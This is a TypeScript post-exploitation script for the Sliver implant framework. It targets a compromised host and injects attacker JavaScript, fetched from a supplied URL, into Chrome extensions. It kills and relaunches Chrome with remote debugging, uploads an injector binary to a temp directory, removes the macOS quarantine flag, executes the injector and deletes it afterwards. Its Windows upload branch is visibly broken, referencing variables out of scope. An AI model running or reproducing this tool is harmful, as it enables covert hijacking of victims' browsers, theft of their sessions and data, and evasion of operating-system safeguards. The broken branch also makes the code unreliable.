#!/usr/bin/env npx ts-node

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import * as fs from 'fs'
import * as readline from 'readline'

import { ArgumentParser } from 'argparse';
import { SliverClient, ParseConfigFile, InteractiveSession } from 'sliver-script'
import { Session } from 'sliver-script/lib/pb/clientpb/client_pb'
import { Upload } from 'sliver-script/lib/pb/sliverpb/sliver_pb';

const DEBUG_PORT = 21099
const MACOS_OVERLORD_AMD64 = "./bin/macos/overlord-amd64"
const WINDOWS_OVERLORD_AMD64 = "./bin/windows/overlord-amd64.exe"
const CHROME_MACOS_PATH = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
const CHROME_WINDOWS_PATHS = [
  "[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application",
  "[DRIVE]:\\Program Files\\Google\\Chrome\\Application",
  "[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application",
  "[DRIVE]:\\Program Files (x86)\\Google\\Application"
]

// CLI Parser
const parser = new ArgumentParser({
  description: 'Inject Chrome Extensions into Chrome Extensions so you can extend the extensions',
  add_help: true,
})
parser.add_argument('--config', { required: true, help: 'path to operator config' })
parser.add_argument('--session', { required: true, type: Number, help: 'target session id' })
parser.add_argument('--js-url', { required: true, help: 'payload .js url' })
const args = parser.parse_args()

// ----------------------------------------------------------------------

async function getSessionById(client: SliverClient, id: number) {
  const sessions = await client.sessions()
  for (let index = 0; index < sessions.length; ++index) {
    if (sessions[index].getId() === id) {
      return sessions[index]
    }
  }
  return null
}

async function getChromeProcess(interact: InteractiveSession) {
  const ps = await interact.ps()
  const processNames = [
    'Google Chrome',
    'chrome.exe'
  ]
  for (let index = 0; index < ps.length; ++index) {
    const process = ps[index]
    for (let processName of processNames) {
      if (process.getExecutable() === processName) {
        return process
      }
    }
  }
  return null
}

async function findUserDataDir(session: Session, interact: InteractiveSession): Promise<string|null> {
  let userDataPath = ''
  switch(session.getOs()) {
    case 'darwin':
      userDataPath = `/Users/${session.getUsername()}/Library/Application Support/Google/Chrome`
      let ls = await interact.ls(userDataPath)
      if (ls.getExists()) {
        return userDataPath
      }
      break
    case 'windows':
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      for (let index = 0; index < characters.length; ++index) {
        userDataPath = '[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\User Data'
        userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
        userDataPath = userDataPath.replace('[USERNAME]', session.getUsername().substring(session.getUsername().indexOf('\\') + 1))
	ls = await interact.ls(userDataPath)
        if (ls.getExists()) {
          return userDataPath
        }
      }
      break
  }
  return null
}

async function getChromePath(session: Session, interact: InteractiveSession): Promise<string> {
  switch(session.getOs()) {
    case 'darwin':
      return CHROME_MACOS_PATH
    case 'windows':
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
      for (let currentPath of CHROME_WINDOWS_PATHS) {
        for (let index = 0; index < characters.length; ++index) {
          let path = currentPath
          path = path.replace('[DRIVE]', characters.charAt(index))
          path = path.replace('[USERNAME]', session.getUsername().substring(session.getUsername().indexOf('\\') + 1))
          let ls = await interact.ls(path)
          if (ls.getExists()) {
            for (let file of ls.getFilesList()) {
              if (file.getName() === 'chrome.exe') {
                return path + `\\${file.getName()}`
              }
            }
          }
        }
      }
      break
  }
  return null
}

function getInjectorPath(session: Session): string {
  switch(session.getOs()) {
    case 'darwin':
      switch (session.getArch()) {
        case 'amd64':
          return MACOS_OVERLORD_AMD64
      }
      break
    case 'windows':
      switch (session.getArch()) {
        case 'amd64':
          return WINDOWS_OVERLORD_AMD64
      }
      break
    default:
      console.error(`[!] Unsupported platform ${session.getOs()}/${session.getArch()}`)
      process.exit(9)
  }
  return ''
}

async function prompt(msg: string): Promise<string> {
  return new Promise(resolve => {
    process.stdout.write(msg)
    const reader = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      terminal: false
    });
    
    reader.on('line', (line: string) => {
      resolve(line)
    })
  })
}

function randomFileName(size: number = 6, prefix: string = ''): string {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let index = 0; index < size; ++index) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return `${prefix}${result}`
}

async function confirm(msg: string): Promise<boolean> {
  const line = await prompt(msg)
  return line.toLowerCase().startsWith('y')
}

async function sleep(ms: number) {
  return new Promise(resolve => {
    setTimeout(resolve, ms)
  })
}

if (fs.existsSync(args.config)) {
  (async () => {

    const config = await ParseConfigFile(args.config)
    const client = new SliverClient(config)
    console.log(`Connecting to ${config.lhost} ...`)
    await client.connect()

    const session = await getSessionById(client, args.session)
    if (session === null) {
      console.log(`Session ${args.session} not found`)
      process.exit(0)
    }
    const interact = await client.interactWith(session)

    // Find UserDataDir
    const userDataDir = await findUserDataDir(session, interact)
    if (userDataDir === null) {
      console.log('[!] Failed to find user data directory')
      process.exit(2)
    }

    // Check if Chrome is running
    const chrome = await getChromeProcess(interact)
    if (chrome) {
      console.log('[*] Chrome is currently running!')
      const confirmTerminate = await confirm('[?] Terminate the current Chrome process? [y/n] ')
      if (!confirmTerminate) {
        process.exit(0)
      }
      console.log('[*] Stopping current process ...')
      await interact.terminate(chrome.getPid())
    }
    
    // Start Chrome with remote debugging enabled
    console.log('[*] Starting Chrome with remote debugging enabled ...')
    const chromePath = await getChromePath(session, interact)
    if (chromePath === null) {
      console.log('[!] Failed to find Chrome path')
      process.exit(3)
    }
    await interact.execute(chromePath, [
      `--remote-debugging-port=${DEBUG_PORT}`,
      `--user-data-dir=${userDataDir}`,
      '--restore-last-session'
    ], false)

    await sleep(750) // Wait for Chrome to init

    console.log(`[*] Uploading payload injector ...`)
    const injectorPath = getInjectorPath(session)
    if (!fs.existsSync(injectorPath)) {
      console.error(`[!] Failed to load payload from: ${injectorPath}`)
      process.exit(5)
    }
    const injectorData = fs.readFileSync(injectorPath)
    let upload: Upload|null = null
    switch(session.getOs()) {
      case 'darwin':
        upload = await interact.upload(`/tmp/${randomFileName()}`, injectorData)
        console.log('[*] Removing quarantine bit ...')
        await interact.execute('chmod', ['+x', upload.getPath()], true)
        await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)   
        break
      case 'windows':
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        for (let index = 0; index < characters.length; ++index) {
          let uploadPath = "[DRIVE]:\\Windows\\Temp"
          userDataPath = userDataPath.replace('[DRIVE]', characters.charAt(index))
          ls = await interact.ls(userDataPath)
          if (ls.getExists()) {
            upload = await interact.upload(`${uploadPath}\\${randomFileName()}.exe`, injectorData)
          }
        }
        break
    }

    await sleep(750) // Wait for file write to complete
   
    console.log(`[*] Executing payload injector with payload ${args.js_url} ...`)
    let injection = null
    injection = await interact.execute(upload.getPath(), ['curse', '-j', args.js_url, '-r', `${DEBUG_PORT}`], true)
    
    console.log('[*] Cleaning up ...')
    await interact.rm(upload.getPath())

    if (injection.getStatus() !== 0) {
      console.error(`[!] Injector exit status ${injection.getStatus()}:`)
      console.error(injection.getResult())
    } else {
      console.log('[*] Successfully injected payload into target extension, good hunting!')
    }

    process.exit(0)
  })();
} else {
  if (args.config) {
    console.log(`Config '${args.config}' does not exist`)
  } else {
    console.log('Missing --config argument, see --help')
  }
}
